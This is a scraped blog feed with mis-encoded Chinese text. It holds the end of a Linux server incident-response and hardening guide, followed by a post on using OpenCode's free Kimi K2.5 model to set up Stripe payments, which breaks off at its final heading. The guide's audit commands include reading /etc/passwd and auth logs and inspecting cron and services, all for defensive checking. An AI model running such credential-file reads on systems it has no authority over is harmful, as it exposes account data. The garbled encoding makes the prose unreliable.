.contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€<strong>ç«‹å³åº”æ€¥å“åº”</strong></h3>
<ol>
<li>
<p><strong>æ–­å¼€ç½‘ç»œï¼ˆå¦‚æƒ…å†µä¸¥é‡ï¼‰</strong><br/>
å¦‚æœæ”»å‡»æ­£åœ¨é€ æˆä¸¥é‡å±å®³ï¼ˆå¦‚å¤§é‡å¤–å‘æµé‡ã€æŒ–çŸ¿ã€å‹’ç´¢ç­‰ï¼‰ï¼Œå¯ä¸´æ—¶åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å°†å®ä¾‹<strong>å®‰å…¨ç»„è§„åˆ™è®¾ä¸ºæ‹’ç»æ‰€æœ‰å…¥ç«™/å‡ºç«™</strong>ï¼Œæˆ–ç›´æ¥<strong>åœæ­¢å®ä¾‹</strong>ï¼Œé˜²æ­¢è¿›ä¸€æ­¥æ‰©æ•£ã€‚</p>
</li>
<li>
<p><strong>ä¸è¦ç›´æ¥åˆ é™¤å¯ç–‘æ–‡ä»¶</strong><br/>
å…ˆä¿ç•™è¯æ®ï¼Œç”¨äºåç»­åˆ†æã€‚å¯ä»¥å°†å¯ç–‘è¿›ç¨‹ã€æ–‡ä»¶ã€æ—¥å¿—å¤‡ä»½åˆ°å…¶ä»–å®‰å…¨ä½ç½®ã€‚</p>
</li>
<li>
<p><strong>æ£€æŸ¥å½“å‰è¿è¡Œçš„è¿›ç¨‹ä¸ç½‘ç»œè¿æ¥</strong><br/>
ç™»å½•æœåŠ¡å™¨åæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">top                    <span class="hljs-comment"># æŸ¥çœ‹é«˜CPUå ç”¨è¿›ç¨‹</span>
ps aux                 <span class="hljs-comment"># åˆ—å‡ºæ‰€æœ‰è¿›ç¨‹</span>
netstat -tulnp         <span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£åŠå¯¹åº”è¿›ç¨‹</span>
ss -tulnp              <span class="hljs-comment"># æ›´ç°ä»£çš„æ›¿ä»£å‘½ä»¤</span>
lsof -i                <span class="hljs-comment"># æŸ¥çœ‹å“ªäº›è¿›ç¨‹åœ¨ä½¿ç”¨ç½‘ç»œ</span>
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥å®šæ—¶ä»»åŠ¡ä¸å¯åŠ¨é¡¹</strong><br/>
ç—…æ¯’å¸¸é€šè¿‡ cron æˆ– systemd æŒä¹…åŒ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">crontab -l             <span class="hljs-comment"># å½“å‰ç”¨æˆ·å®šæ—¶ä»»åŠ¡</span>
<span class="hljs-built_in">cat</span> /etc/crontab       <span class="hljs-comment"># ç³»ç»Ÿçº§å®šæ—¶ä»»åŠ¡</span>
<span class="hljs-built_in">ls</span> /etc/cron.d/
systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/init.d/
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥æ–°å¢ç”¨æˆ·æˆ–å¼‚å¸¸SSHç™»å½•</strong></p>
<pre><code class="hljs language-bash" lang="bash">last                   <span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘ç™»å½•è®°å½•</span>
<span class="hljs-built_in">who</span>                    <span class="hljs-comment"># å½“å‰ç™»å½•ç”¨æˆ·</span>
<span class="hljs-built_in">cat</span> /etc/passwd        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸ç”¨æˆ·ï¼ˆUID 0 é rootï¼‰</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log  <span class="hljs-comment"># Ubuntu/Debian</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure    <span class="hljs-comment"># CentOS/RHEL</span>
</code></pre>
</li>
</ol>
<hr/>
<p>###äºŒã€<strong>æ¼æ´æ’æŸ¥ä¸ä¿®å¤</strong></p>
<ol>
<li>
<p><strong>ç¡®ä¿ç³»ç»Ÿå’Œè½¯ä»¶æœ€æ–°</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt update &amp;&amp; sudo apt upgrade -y

<span class="hljs-comment"># CentOS/RHEL</span>
sudo yum update -y   <span class="hljs-comment"># æˆ– dnf updateï¼ˆCentOS 8+ï¼‰</span>
</code></pre>
</li>
<li>
<p><strong>å…³é—­ä¸å¿…è¦çš„æœåŠ¡å’Œç«¯å£</strong><br/>
ä½¿ç”¨ <code>nmap localhost</code> æˆ– <code>ss -tuln</code> æŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼Œå…³é—­ä¸ç”¨çš„æœåŠ¡ï¼ˆå¦‚ FTPã€Telnetã€Redis æœªæˆæƒè®¿é—®ç­‰ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä¿®æ”¹é»˜è®¤ SSH é…ç½®</strong><br/>
ç¼–è¾‘ <code>/etc/ssh/sshd_config</code>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">Port <span class="hljs-number">22222</span>               <span class="hljs-comment"># æ”¹ä¸ºéæ ‡å‡†ç«¯å£ï¼ˆè®°å¾—åœ¨å®‰å…¨ç»„æ”¾è¡Œï¼‰</span>
PermitRootLogin <span class="hljs-keyword">no</span>       <span class="hljs-comment"># ç¦æ­¢ root ç™»å½•</span>
PasswordAuthentication <span class="hljs-keyword">no</span> <span class="hljs-comment"># æ”¹ç”¨å¯†é’¥ç™»å½•ï¼ˆæ›´å®‰å…¨ï¼‰</span>
AllowUsers your_user     <span class="hljs-comment"># ä»…å…è®¸ç‰¹å®šç”¨æˆ·</span>
</code></pre>
<p>ä¿®æ”¹åé‡å¯ SSHï¼š<code>sudo systemctl restart sshd</code></p>
</li>
<li>
<p><strong>å®‰è£…å¹¶é…ç½®é˜²ç«å¢™</strong></p>
<ul>
<li>ä½¿ç”¨ <code>ufw</code>ï¼ˆUbuntuï¼‰æˆ– <code>firewalld</code>ï¼ˆCentOSï¼‰</li>
<li>æˆ–ç›´æ¥ä¾èµ–<strong>é˜¿é‡Œäº‘å®‰å…¨ç»„</strong>ï¼šåªå¼€æ”¾å¿…è¦ç«¯å£ï¼ˆå¦‚ 80ã€443ã€è‡ªå®šä¹‰ SSH ç«¯å£ï¼‰</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-1">ä¸‰ã€<strong>ä½¿ç”¨å®‰å…¨å·¥å…·æ‰«æ</strong></h3>
<ol>
<li>
<p><strong>å®‰è£…æ€æ¯’/æ¶æ„è½¯ä»¶æ‰«æå·¥å…·</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.clamav.net%2F" target="_blank" title="https://www.clamav.net/" ref="nofollow noopener noreferrer">ClamAV</a>ï¼ˆå¼€æºæ€æ¯’ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsourceforge.net%2Fprojects%2Frkhunter%2F" target="_blank" title="https://sourceforge.net/projects/rkhunter/" ref="nofollow noopener noreferrer">rkhunter</a>ï¼ˆæ£€æµ‹ rootkitï¼‰</li>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.chkrootkit.org%2F" target="_blank" title="http://www.chkrootkit.org/" ref="nofollow noopener noreferrer">chkrootkit</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcisofy.com%2Flynis%2F" target="_blank" title="https://cisofy.com/lynis/" ref="nofollow noopener noreferrer">Lynis</a>ï¼ˆç³»ç»Ÿå®‰å…¨å®¡è®¡ï¼‰</li>
</ul>
<p>ç¤ºä¾‹å®‰è£… rkhunterï¼š</p>
<pre><code class="hljs language-css" lang="css">sudo apt install rkhunter -y
sudo rkhunter <span class="hljs-attr">--update</span>
sudo rkhunter <span class="hljs-attr">--check</span>
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨é˜¿é‡Œäº‘è‡ªå¸¦çš„å®‰å…¨äº§å“</strong></p>
<ul>
<li>
<p><strong>äº‘å®‰å…¨ä¸­å¿ƒï¼ˆåŸå®‰éª‘å£«ï¼‰</strong> ï¼šå…è´¹ç‰ˆå³å¯ç›‘æ§å…¥ä¾µã€ç—…æ¯’ã€æ¼æ´ã€‚</p>
<ul>
<li>ç™»å½• <a href="https://link.juejin.cn?target=https%3A%2F%2Fyundun.console.aliyun.com%2F" target="_blank" title="https://yundun.console.aliyun.com/" ref="nofollow noopener noreferrer">é˜¿é‡Œäº‘æ§åˆ¶å° &gt; äº‘å®‰å…¨ä¸­å¿ƒ</a></li>
<li>å¼€å¯â€œç—…æ¯’æŸ¥æ€â€ã€â€œåŸºçº¿æ£€æŸ¥â€ã€â€œå…¥ä¾µæ£€æµ‹â€</li>
</ul>
</li>
<li>
<p>è‹¥æœªå¼€å¯ï¼Œè¯·ç«‹å³å¯ç”¨ï¼Œå¹¶å…¨ç›˜æ‰«æã€‚</p>
</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">å››ã€<strong>é•¿æœŸé˜²æŠ¤å»ºè®®</strong></h3>
<ol>
<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸è¦ç”¨ root è¿è¡Œä¸šåŠ¡ç¨‹åºã€‚</li>
<li><strong>å®šæœŸå¤‡ä»½</strong>ï¼šä½¿ç”¨å¿«ç…§æˆ– OSS å¤‡ä»½å…³é”®æ•°æ®ã€‚</li>
<li><strong>å¯ç”¨å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰</strong> ï¼šä¿æŠ¤é˜¿é‡Œäº‘è´¦å·ã€‚</li>
<li><strong>æ—¥å¿—é›†ä¸­ç®¡ç†</strong>ï¼šå°† <code>/var/log/</code> æ—¥å¿—å‘é€åˆ° SLSï¼ˆæ—¥å¿—æœåŠ¡ï¼‰ä¾¿äºåˆ†æã€‚</li>
<li><strong>å®šæœŸå®‰å…¨å®¡è®¡</strong>ï¼šæ¯æœˆæ£€æŸ¥ä¸€æ¬¡ç”¨æˆ·ã€ç«¯å£ã€è¿›ç¨‹ã€å®šæ—¶ä»»åŠ¡ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-3">äº”ã€<strong>å¦‚æœå·²ä¸¥é‡æ„ŸæŸ“ï¼Ÿ</strong></h3>
<ul>
<li>
<p><strong>æœ€å½»åº•çš„æ–¹å¼</strong>ï¼š</p>
<ol>
<li>åˆ›å»ºå½“å‰ç³»ç»Ÿå¿«ç…§ï¼ˆç”¨äºå–è¯ï¼‰</li>
<li><strong>é‡è£…ç³»ç»Ÿ</strong>ï¼ˆä½¿ç”¨é˜¿é‡Œäº‘æä¾›çš„å¹²å‡€é•œåƒï¼‰</li>
<li><strong>ä»…æ¢å¤ç¡®è®¤å¹²å‡€çš„æ•°æ®</strong>ï¼ˆä¸è¦æ¢å¤å¯æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬ï¼‰</li>
<li>é‡æ–°éƒ¨ç½²åº”ç”¨ï¼Œå¹¶åº”ç”¨ä¸Šè¿°å®‰å…¨æªæ–½</li>
</ol>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹]]></title>    <link>https://juejin.cn/post/7600986252448972840</link>    <guid>https://juejin.cn/post/7600986252448972840</guid>    <pubDate>2026-01-30T12:26:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252448972840" data-draft-id="7600799940971495464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-01-30T12:26:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­Ÿå¥AIç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…è´¹æ¥å…¥ Stripeï¼Œä¸åˆ° 2 å°æ—¶æå®šï¼šOpenCode + K2.5 å®æ“å…¨æµç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­Ÿå¥AIç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:26:16.000Z" title="Fri Jan 30 2026 12:26:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å­Ÿå¥ã€‚</p>
<p>ä»Šå¤©å°è¯•ç”¨ OpenCode çš„<strong>å…è´¹ K2.5 æ¨¡å‹</strong>æ¥å…¥ Stripeï¼Œæ•´ä¸ªè¿‡ç¨‹éå¸¸ä¸æ»‘ï¼Œ<strong>ä¸€åˆ†é’±æ²¡èŠ±</strong>ï¼Œä¸åˆ° 2 å°æ—¶å°±æå®šäº†ã€‚</p>
<p>K2.5 æ•´ä½“è¡¨ç°æŒºå¼ºçš„ï¼Œå“åº”å¿«ã€é¢åº¦å……è£•ï¼ŒæŠŠå®Œæ•´è¿‡ç¨‹åˆ†äº«ç»™å¤§å®¶ã€‚</p>
<h2 data-id="heading-0">01 è¿æ¥æ¨¡å‹</h2>
<p>å®‰è£…å¥½ OpenCode ä¹‹åï¼Œè¾“å…¥ <code>/connect</code> å‘½ä»¤æ¥è¿æ¥æ¨¡å‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c903e0813ee243778908f0ca5c1d7aed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=BY1uLlvy5NPxtj3cPON9C69QVUA%3D" alt="" loading="lazy"/></p>
<p>é€‰æ‹© <strong>Opencode Zen</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bd21a530cb243acbb48954502edc847~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=%2BFpeU8D4TdR4WVNdeEAGO3zG%2Fj0%3D" alt="" loading="lazy"/></p>
<p>ç„¶åè¾“å…¥ä½ çš„ API Key å°±å¯ä»¥ä½¿ç”¨äº†ã€‚Key å¯ä»¥å» OpenCode å®˜ç½‘çš„ Zen æ¨¡å—ç”³è¯·ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">opencode.ai/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17451ae345bb4f54ab182dad71535061~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=w5Vm%2BlOizvmGTCDiHyk3afSOZns%3D" alt="" loading="lazy"/></p>
<p>è¾“å…¥å®Œ Key ä¹‹åï¼Œä¼šå‘ç°æœ‰ <strong>5 ä¸ªæ¨¡å‹éƒ½å¯ä»¥å…è´¹ä½¿ç”¨</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/705f3a90d1144e548a3206e0a46d6698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9OQsiQAe%2BvpgmdA5%2FiyhK23WWOE%3D" alt="" loading="lazy"/></p>
<p>é€‰æ‹© <strong>Kimi K2.5 Free</strong>ï¼Œå°±å¯ä»¥å¼€å§‹äº†ã€‚</p>
<h2 data-id="heading-1">02 è®© K2.5 å¸®æˆ‘æ¥ Stripe</h2>
<p>å› ä¸ºæˆ‘æ˜¯ç¬¬ä¸€æ¬¡æ¥å…¥ Stripeï¼Œä¹Ÿæ²¡æœ‰åº•ï¼Œæ‰€ä»¥å…ˆè®©å®ƒç»™ç‚¹å»ºè®®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb8e2f50f1c84057bd91b9f6ab1aa48f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=4KW9hx6jdMtc3ShMc9PG8bFK3P8%3D" alt="" loading="lazy"/></p>
<p>å®ƒå‘Šè¯‰æˆ‘è¦åœ¨ Stripe åå°åˆ›å»ºäº§å“ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e37d6c812464b12b9054ab676af5bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=dlPwZXavenxHz4KDoLg713ejWVI%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡æˆ‘æ¯”è¾ƒæ‡’ï¼Œä¸æƒ³æ‰‹åŠ¨åˆ›å»ºï¼Œå°±é—®å®ƒèƒ½ä¸èƒ½ç”¨ API æ¥æå®šï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfa361622ae42a784add51271894d05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=ThbF3qlMdg%2BtGub1J7CLPdnjgyA%3D" alt="" loading="lazy"/></p>
<p>å®ƒç›´æ¥å¸®æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œåªéœ€è¦å¡«å…¥å¯†é’¥å°±å¥½ã€‚æˆ‘å» Stripe åå°æ‹¿åˆ°å¯†é’¥ï¼Œå¡«è¿›å»ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a74d5ab16274ab98c3e917f5c49af6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=E0m09wXcNj2jQUfqj8CfpIszH3s%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œ<strong>å®ƒä¸€æŠŠå¸®æˆ‘æŠŠä»£ç å†™å¥½äº†ï¼Œäº§å“ä¹Ÿåˆ›å»ºå¥½äº†</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0671b0b5d5254aaeab15b1fa463ba8f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=HkIlufmsgtVJL%2BRQwd0kbaj0gD8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">03 åˆ›å»º Webhooks</h2>
<p>æ¥ä¸‹æ¥æ˜¯åˆ›å»º Webhooksã€‚æˆ‘è¿˜æ˜¯æ¯”è¾ƒæ‡’ï¼Œçœ‹çœ‹å®ƒèƒ½ä¸èƒ½å¸®æˆ‘åˆ›å»ºâ€”â€”ç»“æœ<strong>ç›´æ¥ä¸€é”®æå®š</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e82cd7bec8ad48cf9abb33cd37c8b6ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=PWpADvxinMWbpg0s0t6ayG8SE7c%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ç»™å®ƒä¸€ä¸ªæœ¬åœ°è°ƒè¯•åœ°å€ï¼Œå®ƒæ›¿æ¢åˆ° Webhooks é‡Œï¼Œå‘Šè¯‰æˆ‘å¯ä»¥æµ‹è¯•äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/354909a348ec4014bf82c936ba54b9a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9KWIYYdoDyNvcWUPpT0hCl%2FXczo%3D" alt="" loading="lazy"/></p>
<p><strong>ä»˜æ¬¾ä¸€æ¬¡æˆåŠŸï¼Œæ²¡æœ‰ä»»ä½•æ³¢æŠ˜ï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3b3797ed32e4765a94229696fc1d5af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=K49p2nJ8NE37e7c3%2BYXJRUeZHNU%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¼ç¯å¢ƒå†æ¥ä¸€éï¼Œç›´æ¥éƒ¨ç½²ä¸Šçº¿ã€‚</p>
<h2 data-id="heading-3">04 å†™åœ¨æœ€å</h2>
